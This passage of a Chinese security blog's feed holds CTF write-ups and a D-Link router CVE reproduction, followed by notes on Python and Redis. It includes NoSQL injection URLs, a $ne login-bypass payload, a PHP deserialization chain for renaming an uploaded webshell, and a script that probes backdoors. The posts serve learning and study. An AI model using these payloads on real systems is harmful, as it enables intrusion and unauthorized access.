=&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">        [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $filters = [</span><br><span class="line">        [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>array_merge</code>函数将<code>$pipeline</code>和<code>filters</code>进行合并</p><p>查找资料得知</p><blockquote><p>在mongodb的aggregate中，可以使用$cond进行条件语句：</p></blockquote><p>并且：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/noSql1.png" alt=""></p><p>我们可以构造如下链接，匹配到<code>flag</code>时将其移除</p><p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category</code></p><blockquote><p>利用条件语句，发现flags时，就输出其title：</p></blockquote><p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category</code></p><p>从title中我们得知有text，那么读取：</p><p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category</code></p><p>就可以获得flag了</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql2.png" alt=""></p><h2>NoSQL注入实践</h2><p>MongoDb作为一个NoSQL的数据库，操作其实还是很SQL很相似的</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql3.png" alt=""></p><p>都有数据库，不同的是集合对应于表，文档对应于行，字段对应于列</p><p>这张图显示了映射关系：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql4.png" alt=""></p><p>于是操作MongoDb时可以理解为选择数据库，然后选择collection，然后构造查询语句进行查询</p><p>比如demo.html</p><p><code>$m = new MongoClient()</code>连接数据库，<code>$db=$m-&gt;test</code>选择test数据库，然后选择collection : <code>$collection=$db-&gt;uses</code></p><p>构造的查询语句为：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$data = array(</span><br><span class="line">&apos;username&apos; =&gt;  $_REQUEST[&apos;username&apos;],</span><br><span class="line">&apos;password&apos; =&gt;  $_REQUEST[&apos;password&apos;]</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>之后进行查询： <code>$cursor = $collection-&gt;find($data)</code></p><p>这里没有字符串的拼接，似乎无法注入，但是如果我们传入的username和password都是数组的话，那么查询的语句就会成为这样：</p><p>构造的URL：<code>http://localhost/NoSQLI/login/login.php?username[$ne]=1&amp;password[$ne]=1&amp;login-submit=login</code></p><p>此时拼接的<code>$data</code></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql5.png" alt=""></p><p>json_encode后得到：<code>&quot;{&quot;username&quot;:{&quot;$ne&quot;:&quot;1&quot;},&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}&quot;</code></p><h2>参考</h2><p><a href="https://blog.szfszf.top/tech/nosql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93mongodb/#MongoDB" target="_blank" rel="noopener">NoSQL注入总结(MongoDB)</a></p><p><a href="https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/" target="_blank" rel="noopener">019 CyBRICS CTF Quals wp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;cybrics noSQL&lt;/h2&gt;
&lt;p&gt;这道题是cybrics的一道web题，由于是第一次接触noSQL注入，所以单独拿出来好好研究一下&lt;/p&gt;
&lt;p&gt;php操作mongodb的语法：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;tab
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="cybrics" scheme="https://prontosil.club/tags/cybrics/"/>
    
      <category term="NoSQL" scheme="https://prontosil.club/tags/NoSQL/"/>
    
  </entry>
  
  <entry>
    <title>qwb复现</title>
    <link href="https://prontosil.club/2019/08/03/qwb%E5%A4%8D%E7%8E%B0/"/>
    <id>https://prontosil.club/2019/08/03/qwb复现/</id>
    <published>2019-08-03T14:23:50.000Z</published>
    <updated>2019-08-04T06:01:55.712Z</updated>
    
    <content type="html"><![CDATA[<p>复现一些qwb的题目</p><h2>upload</h2><p>可以通过dirsearch找到泄露的源码 ， -u指定url， -e指定插件如果是代码审计题，而且是文件很多的，需要找到利用点，我们直接搜索<code>unserialize</code>找到一处可以利用的代码：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">       $profile=cookie(<span class="string">'user'</span>);  <span class="comment">//获取到cookie中的user值</span></span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile)); <span class="comment">//直接反序列化</span></span><br><span class="line">           <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">           <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>接下来去寻找哪里调用了这个方法，在Profile这个类中<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">         <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">             $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">             <span class="keyword">exit</span>();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure></p><p><code>upload_img方法</code>会调用<code>login_check</code>反序列化</p><blockquote><p>而这个操作中的 $this-&gt;ext、$this-&gt;filename_tmp、$this-&gt;filename 均可通过反序列化控制。</p></blockquote><p>同时在<code>Profile.php</code>文件的末尾还有一处</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这两个函数的意思是如果访问了类中的<code>private</code>属性，就会调用<code>__get</code>方法，如果调用了类中不存在的方法，就会通过<code>__call</code>对<code>$this-&gt;name</code>所指向的方法进行调用</p><p>意味着我们可以调用任意的类方法</p><p>同时在<code>Register.php</code>中有一处：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先上传一个图片马，之后通过<code>Register</code>类的<code>__destruct</code>方法，调用<code>__get</code>方法得到函数名<code>upload_img</code>，再调用<code>__call</code>方法，通过调用<code>upload_img</code>可以对图片马进行改名</p><p>如果我们将<code>$this-&gt;checker</code>赋值为<code>Profile</code>类，由于<code>Profile</code>类中不存在<code>index</code>方法，就会触发<code>__call</code>，这样就能构造一条完成的攻击链</p><h2>高明的黑客</h2><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/var/www/html/src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="string">'uname'</span></span><br><span class="line">            flag = <span class="string">'Linux'</span></span><br><span class="line">            <span class="comment"># command = 'phpinfo();'</span></span><br><span class="line">            <span class="comment"># flag = 'phpinfo'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.get(url=<span class="string">'http://127.0.0.1:8888/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.post(url=<span class="string">'http://127.0.0.1:8888/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复现一些qwb的题目&lt;/p&gt;
&lt;h2&gt;upload&lt;/h2&gt;
&lt;p&gt;可以通过dirsearch找到泄露的源码 ， -u指定url， -e指定插件
如果是代码审计题，而且是文件很多的，需要找到利用点，我们直接搜索&lt;code&gt;unserialize&lt;/code&gt;找到一处可以利用
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="web" scheme="https://prontosil.club/tags/web/"/>
    
      <category term="thinkphp" scheme="https://prontosil.club/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>DIR-823G复现</title>
    <link href="https://prontosil.club/2019/08/03/DIR-823G%E5%A4%8D%E7%8E%B0/"/>
    <id>https://prontosil.club/2019/08/03/DIR-823G复现/</id>
    <published>2019-08-03T10:05:40.000Z</published>
    <updated>2019-08-03T10:07:13.522Z</updated>
    
    <content type="html"><![CDATA[<h2>Dlink DIR-823G漏洞复现(CVE-2019-7298, CVE-2019-7297)</h2><p>binwale提取文件</p><p>文件下载<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823GA1_FW102B03.bin" target="_blank" rel="noopener">地址</a></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823.png" alt=""></p><p>之后进行固件的模拟，</p><p>成功ping通网络<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ping0.png" alt=""></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-4.png" alt=""></p><p>第一次进入路由器需要需要进行一些设置页面，查看是否有未授权访问的情况</p><p>导出配置文件（信息泄露）。</p><p><img src="https://i.imgur.com/2ElxWaU.png" alt="DIR823-0"></p><p>&lt;!-- <img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-0.png" alt=""> --&gt;</p><p>浏览器访问直接弹出了下载页面</p><p><img src="https://i.imgur.com/7Y9pWFQ.png" alt="DIR823-1"></p><p>导出配置文件，<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-2.png" alt=""></p><p>获取到系统信息</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-3.png" alt=""></p><h2>goahead程序分析(命令注入)</h2><p>在查看固件的bin目录时发现了一个goahead的程序，说明此路由器是通过goahead进行开发的</p><p>拖入到IDA中进行分析，发现0x42424C处注册了处理函数</p><p>抓取到登陆的数据包，是发往/HNAP1/的</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-5.png" alt=""></p><p>分析<code>/HNAP1</code> 处理函数的逻辑。 函数位于<code>0x42383C</code></p><p>在这个部分，从函数表中进行遍历，寻找函数</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-6.png" alt=""></p><p>函数表如下：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-7.png" alt=""></p><p>找到了需要调用的处理函数后，会首先记录 POST 的原始报文, 首先用 snprintf 生成命令， 然后使用 system 执行。</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-8.png" alt=""></p><p>我们可以通过直接注入 <code>'</code> 来命令执行</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-9.png" alt=""></p><p>验证一下：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-10.png" alt=""></p><h2>参考</h2><p><a href="https://github.com/leonW7/D-Link/blob/master/Vul_2.md" target="_blank" rel="noopener">DIR-823G HNAP_Entry_Func</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;Dlink DIR-823G漏洞复现(CVE-2019-7298, CVE-2019-7297)&lt;/h2&gt;
&lt;p&gt;binwale提取文件&lt;/p&gt;
&lt;p&gt;文件下载&lt;a href=&quot;https://raw.githubusercontent.com/xinyongpeng/g
      
    
    </summary>
    
      <category term="IOT" scheme="https://prontosil.club/categories/IOT/"/>
    
    
      <category term="CVE" scheme="https://prontosil.club/tags/CVE/"/>
    
      <category term="goahead" scheme="https://prontosil.club/tags/goahead/"/>
    
  </entry>
  
  <entry>
    <title>python文档阅读笔记3</title>
    <link href="https://prontosil.club/2019/07/31/python%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B03/"/>
    <id>https://prontosil.club/2019/07/31/python文档阅读笔记3/</id>
    <published>2019-07-31T14:16:03.000Z</published>
    <updated>2019-08-01T01:18:42.222Z</updated>
    
    <content type="html"><![CDATA[<h2>python文件操作</h2><p>读文件，使用<code>open</code>函数打开一个文件如果不指定模式，则默认以 text mode 打开</p><blockquote><p>这意味着从文件中读取或写入字符串时，都会以指定的编码方式进行编码。如果未指定编码格式，默认值与平台相关</p></blockquote><p><code>read()</code>方法，可选参数<code>size</code>，当 size 被省略或者为负的时候，将读取并返回文件的整个内容</p><p><code>readline()</code>方法，从文件中读取一行</p><p>如果要遍历文件，可以采取遍历文件对象的方式：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line"><span class="meta">... </span>    print(line, end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></p><p>这种实现方式比较高效</p><p>在编写脚本的过程中，注意文件的打开方式，编码这些小细节</p><p>写文件</p><blockquote><p>f.write(string) 会把 string 的内容写入到文件中，并返回写入的字符数。</p></blockquote><blockquote><p>f.tell() 返回一个整数，给出文件对象在文件中的当前位置，表示为二进制模式下时从文件开始的字节数，以及文本模式下的不透明数字。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;python文件操作&lt;/h2&gt;
&lt;p&gt;读文件，使用&lt;code&gt;open&lt;/code&gt;函数打开一个文件
如果不指定模式，则默认以 text mode 打开&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这意味着从文件中读取或写入字符串时，都会以指定的编码方式进行编码。如果未指定编
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>cybrics复现</title>
    <link href="https://prontosil.club/2019/07/31/cybrics%E5%A4%8D%E7%8E%B0/"/>
    <id>https://prontosil.club/2019/07/31/cybrics复现/</id>
    <published>2019-07-31T12:52:25.000Z</published>
    <updated>2019-07-31T12:53:44.973Z</updated>
    
    <content type="html"><![CDATA[<p>目前太菜了，没做出几道cybrics的题目，趁着题目还在复现一波</p><h2>Zakukozh</h2><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/cybrics0.png" alt=""><a href="https://dystopia.sg/files/zakukozh.bin" target="_blank" rel="noopener">下载地址</a></p><p>下载了一个文件，于是想查看文件类型：</p><p><code>zakukozh.bin: data</code></p><p>题目中有提示说是<code>affine cipher</code></p><p><code>affine cipher</code>中文翻译过来就是放射密码，可以理解成简单的替换加密，比如wikipedia上举出的<a href="https://en.wikipedia.org/wiki/Affine_cipher#Examples" target="_blank" rel="noopener">栗子</a></p><blockquote><p>一个大小为m的字母表，通过变换 $E(x) = (ax+b) mod , m$ 得到密文</p></blockquote><p>查看文件的十六进制形式，学习一些<code>hexdump</code>命令</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pxy@LAPTOP-UBIEP4K5  /mnt/f/1.ctf/cybrics/crypto  hexdump -C zakukozh.bin| head</span><br><span class="line">00000000  60 09 eb 82 1c ef df ef  59 59 59 1c a0 91 55 27  |`.......YYY...U&apos;|</span><br><span class="line">00000010  59 59 77 bc 59 59 59 2e  d1 77 59 59 59 a9 44 38  |YYw.YYY..wYYY.D8|</span><br><span class="line">00000020  31 59 59 59 68 16 27 82  37 59 8b 6b fd 00 59 59  |1YYYh.&apos;.7Y.k..YY|</span><br><span class="line">00000030  59 95 62 28 dc 28 59 59  b8 ba fe 1d 08 a4 59 59  |Y.b(.(YY......YY|</span><br><span class="line">00000040  59 e0 e9 91 90 16 59 59  2b c6 59 59 2b c6 68 02  |Y.....YY+.YY+.h.|</span><br><span class="line">00000050  da 31 35 59 59 fe 7e a0  55 28 45 61 db 3c 3d 10  |.15YY.~.U(Ea.&lt;=.|</span><br><span class="line">00000060  08 a6 a1 a3 a4 89 ab 3e  68 b0 1b 82 a6 35 fd cd  |.......&gt;h....5..|</span><br><span class="line">00000070  1c e0 d9 de 59 67 7f e3  45 70 b0 e2 e6 22 55 17  |....Yg..Ep...&quot;U.|</span><br><span class="line">00000080  32 d9 de 3e 87 1d d2 c2  59 51 e7 e6 59 49 a2 82  |2..&gt;....YQ..YI..|</span><br><span class="line">00000090  68 39 eb ab 77 19 7d fd  a4 d9 a1 b0 ef 59 f8 07  |h9..w.&#125;......Y..|</span><br></pre></td></tr></table></figure></p><p>查看十六进制数据如上，根据题目的提示，这就是仿射加密之后的结果，那么如何确定a,b,m这三个参数</p><p>由于是二进制数据，那么m就是256a和b就通过爆破来解决</p><p>脚本如下：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reffine</span><span class="params">(a, b, c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr((a * (ord(c) - b)) % <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'zakukozh.bin'</span>) <span class="keyword">as</span> f:</span><br><span class="line">encrypted = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        decrypted = <span class="string">''</span>.join([reffine(i, j, c) <span class="keyword">for</span> c <span class="keyword">in</span> encrypted])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'output/dec_&#123;&#125;_&#123;&#125;.out'</span>.format(i, j), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decrypted)</span><br></pre></td></tr></table></figure></p><p>就是跑的太慢了 😂</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;目前太菜了，没做出几道cybrics的题目，趁着题目还在复现一波&lt;/p&gt;
&lt;h2&gt;Zakukozh&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinyongpeng/gitpic/master/cybrics0.
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
      <category term="cybrics" scheme="https://prontosil.club/tags/cybrics/"/>
    
  </entry>
  
  <entry>
    <title>redis源码阅读——dict</title>
    <link href="https://prontosil.club/2019/07/30/redis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94dict/"/>
    <id>https://prontosil.club/2019/07/30/redis源码阅读——dict/</id>
    <published>2019-07-30T15:31:53.000Z</published>
    <updated>2019-07-30T16:02:23.958Z</updated>
    
    <content type="html"><![CDATA[<h2>dict类型</h2><p>先看宏定义</p><p>最基本的是dict类型，如下：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dict &#123;</span><br><span class="line">    dictType *type;</span><br><span class="line">    void *privdata;</span><br><span class="line">    dictht ht[2];</span><br><span class="line">    PORT_LONG rehashidx; /* rehashing not in progress if rehashidx == -1 */</span><br><span class="line">    int iterators; /* number of iterators currently running */</span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure></p><ul><li>dictType 是一个结构体，包含了dict的一些基础方法</li><li>privdata 是私有数据</li><li>dictht 是哈希表</li><li>rehashidx 代表是否在进行重哈希，如果不为-1则代表正在进行重哈希</li><li>iterators 代表迭代器，暂时还不太理解</li></ul><p>接下来看哈希表的结构(dictht):</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dictht &#123;</span><br><span class="line">    dictEntry **table;</span><br><span class="line">    PORT_ULONG size;</span><br><span class="line">    PORT_ULONG sizemask;</span><br><span class="line">    PORT_ULONG used;</span><br><span class="line">&#125; dictht;</span><br></pre></td></tr></table></figure></p><ul><li>table是一个指向<code>dictEntry</code>的二级指针</li><li>size代表哈希表的大小</li><li>sizemask 总是等于size-1</li><li>used代表该哈希表已有的节点数量</li></ul><p>这是<code>dictht</code>的构造：<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/graphviz-bd3eecd927a4d8fc33b4a1c7f5957c52d67c5021.png" alt=""></p><p>不过这里为什么要二级指针呢？</p><blockquote><p>可以这样理解，因为<code>dictEntry *</code>本身就是一个一级指针，同时<code>table</code>指向的又是一个指针数组，所以这里需要二级指针了</p></blockquote><h3>复习一下数组指针和指针数组的概念</h3><p>数组指针，本质上还是指针</p><p><code>int (*p)[n]</code><code>()</code>运算优先级更高，<code>*</code>优先与p结合，p还是一个指针，不过p指向的是一个数组，这时候<code>p+1</code>运算的步长就是<code>n</code>,故这样的指针也叫行指针</p><p>指针数组<code>int *p[n]</code><code>[]</code>优先级更高，p先与方括号结合，这时候p代表的是一个数组，这个数组中每个元素都是一个指针，故此时p就是二级指针</p><p>之后继续看<code>dictEntry</code>类型</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dictEntry &#123;</span><br><span class="line">    void *key;</span><br><span class="line">    union &#123;</span><br><span class="line">        void *val;</span><br><span class="line">        uint64_t u64;</span><br><span class="line">        int64_t s64;</span><br><span class="line">        double d;</span><br><span class="line">    &#125; v;</span><br><span class="line">    struct dictEntry *next;</span><br><span class="line">&#125; dictEntry;</span><br></pre></td></tr></table></figure></p><p>这里面存储了key-value键值对，其中<code>key</code>是一个<code>void*</code>类型的指针，可以代表任意类型的数据，但是<code>value</code>是一个联合体，可以在指针，整数和浮点数中取值</p><p><code>next</code>属性是指向另一个哈希表节点的指针， 这个指针可以将多个哈希值相同的键值对连接在一次， 以此来解决键冲突（collision）的问题</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dictentry.png" alt=""></p><h2>参考</h2><p><a href="http://redisbook.com/preview/dict/datastruct.html" target="_blank" rel="noopener">字典的实现</a><a href="http://zhangtielei.com/posts/blog-redis-dict.html" target="_blank" rel="noopener">Redis内部数据结构详解(1)——dict</a><a href="https://www.cnblogs.com/hongcha717/archive/2010/10/24/1859780.html" target="_blank" rel="noopener">数组指针和指针数组的区别</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;dict类型&lt;/h2&gt;
&lt;p&gt;先看宏定义&lt;/p&gt;
&lt;p&gt;最基本的是dict类型，如下：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
